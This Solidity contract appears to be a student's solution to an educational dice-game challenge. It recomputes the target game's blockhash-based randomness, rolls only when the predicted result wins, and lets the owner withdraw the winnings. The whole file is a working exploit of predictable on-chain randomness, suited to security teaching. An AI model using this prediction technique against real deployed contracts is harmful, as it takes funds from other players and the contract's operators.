pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        require(address(this).balance >= _amount, "Insufficient balance");
        require(_addr != address(0), "Invalid address");
        
        (bool success, ) = _addr.call{value: _amount}("");
        require(success, "Transfer failed");
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() public {
        // Ensure we have enough balance to roll
        require(address(this).balance >= 0.002 ether, "Not enough balance to roll");
        
        // Predict the random number using the EXACT same logic as DiceGame
        uint256 nonce = diceGame.nonce();
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
        uint256 roll = uint256(hash) % 16;
        
        console.log("Predicted roll:", roll);
        console.log("Current nonce:", nonce);
        console.log("Block number:", block.number);
        
        // Only roll if we predict a winning number (0, 1, 2, 3, 4, or 5)
        if (roll <= 5) {
            console.log("Predicted win! Rolling the dice...");
            diceGame.rollTheDice{value: 0.002 ether}();
        } else {
            console.log("Predicted loss (roll:", roll, "). Not rolling.");
        }
    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {
        console.log("RiggedRoll received:", msg.value, "wei from:", msg.sender);
    }
}
